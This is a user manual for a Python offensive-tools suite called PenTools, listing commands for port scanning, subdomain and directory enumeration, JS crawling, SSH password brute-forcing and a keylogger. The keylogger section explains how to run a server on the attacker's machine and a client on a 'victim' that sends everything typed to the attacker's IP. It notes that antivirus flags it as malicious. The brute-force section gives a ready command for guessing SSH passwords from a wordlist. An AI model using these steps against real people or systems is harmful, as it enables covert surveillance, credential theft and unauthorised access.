# 📘 User Manual: PenTools

This document explains step-by-step how to use each of the tools in your **PenTools** cybersecurity suite.

## 1. Port Scanner 🕵️‍♂️
Discovers open services on a machine.
- **Basic:** `python network/port_scanner.py 192.168.1.1`
- **Specific Range:** `python network/port_scanner.py 192.168.1.1 -p 1-100`
- **Higher Speed:** `python network/port_scanner.py 192.168.1.1 -t 200`

## 2. Subdomain Enumeration 🌐
Finds hidden subdomains of a website.
- **Web Mode (VHOST):** Searches for hidden virtual hosts.
  `python web/subdomain_enumeration.py 10.10.10.10 google.com`
- **DNS Mode (Recommended):** Queries the internet to see if the subdomain exists (faster).
  `python web/subdomain_enumeration.py 8.8.8.8 google.com --dns`

## 3. KeyLogger (Keyboard Spy) ⌨️
Records what the victim types and sends it to you.
1.  **On YOUR machine (Attacker):** Start the server to receive data.
    `python spyware/keylogger_server.py -p 8080`
2.  **On the victim:** Run the client (needs admin permissions).
    `python spyware/keylogger.py --ip <YOUR_IP> --port 8080`
    *(When the victim presses ENTER, you will receive everything they typed)*.
    *Note: If antivirus detects it, that is normal, as it is malicious behavior.*

## 4. SSH Brute Force (Password Cracker) 🔓
Attempts to guess the password of an SSH server.
`python network/ssh_bruteforce.py 192.168.1.50 user resources/wordlists/dictionary.txt -t 10`

## 5. JS File Crawler 🕸️
Downloads all JavaScript files from a website to analyze them for vulnerabilities.
`python web/js_crawler.py http://example.com -o downloaded_scripts`

## 6. Directory Enumeration 📂
Searches for hidden folders on a website (e.g., /admin, /backup).
`python web/directory_enumeration.py 192.168.1.1 -w resources/wordlists/common.txt`

---
---
> **Note:**
> You can also find pre-compiled executables in the `bin/` directory. You can run them directly from the command line without `python`.
> Example: `bin\port_scanner.exe <args>`
